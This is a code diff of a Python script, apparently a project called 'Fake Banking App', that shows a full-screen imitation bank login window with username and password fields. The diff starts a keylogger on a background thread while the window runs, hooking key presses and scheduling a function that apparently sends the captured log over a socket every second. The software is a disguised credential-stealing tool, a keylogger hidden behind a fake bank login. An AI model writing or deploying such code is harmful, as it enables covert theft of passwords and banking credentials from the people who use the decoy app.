@@ -5,6 +5,7 @@ import time
 from tkinter import *
 from tkinter import ttk
 from PIL import Image, ImageTk
+import threading
 
 
 def keyPress(event):
@@ -60,37 +61,7 @@ def sendMessage():
     s.close()
 
 
-def main():
-
-    # Creating window for app
-    root = Tk()
-    root.title("Fake Banking App")
-    root.maxsize(900, 600)
-
-    #Setting up the title box and image in box
-    img = Image.open("fakebankicon.jpg")
-    image = ImageTk.PhotoImage(img)
-    Label(root, image=image).pack()
-    
-    #Set up window for username
-    username_frame = Frame(root, bg='grey')
-    username_frame.pack()
-    Label(username_frame, text="Username", bg='white').pack(side='left', padx=5)
-    username_entry= Entry(username_frame, bd=3)
-    username_entry.pack(side='right')
-   
-    #Setup window for password
-    password_frame = Frame(root, bg='grey')
-    password_frame.pack()
-    Label(password_frame, text="Password", bg='white').pack(side='left', padx=7)
-    password_entry= Entry(password_frame, bd=3)
-    password_entry.pack(side='right')
-
-
-    root.mainloop()
-
-
-
+def runKeylogger():
     keyboard.on_press(keyPress)
     #Send log file every day?  Needs function for that?
     schedule.every(1).seconds.do(sendMessage)
@@ -99,6 +70,42 @@ def main():
     while True:
         schedule.run_pending()
         time.sleep(1)
+        
+
+
+def main():
+
+    # Creating window for app
+    root = Tk()
+    root.title("Fake Banking App")
+    root.state('zoomed')
+
+    #Setting up the title box and image in box
+    img = Image.open("fakebankicon.jpg")
+    image = ImageTk.PhotoImage(img)
+    Label(root, image=image).pack(pady=50)
+    
+    #Set up window for username
+    username_frame = Frame(root, bg='grey')
+    username_frame.pack()
+    Label(username_frame, text="Username", bg='white').pack(side='left', padx=5, pady=10)
+    username_entry= Entry(username_frame, bd=3)
+    username_entry.pack(side='right')
+   
+    #Setup window for password
+    password_frame = Frame(root, bg='grey')
+    password_frame.pack()
+    Label(password_frame, text="Password", bg='white').pack(side='left', padx=7, pady=10)
+    password_entry= Entry(password_frame, bd=3)
+    password_entry.pack(side='right')
+
+    #root.after(1000, runKeylogger)
+    #root.after_idle(runKeylogger)
+    t = threading.Thread(target=runKeylogger)
+    t.start()
+    root.mainloop()
+
+
 
    
 if __name__ == "__main__":
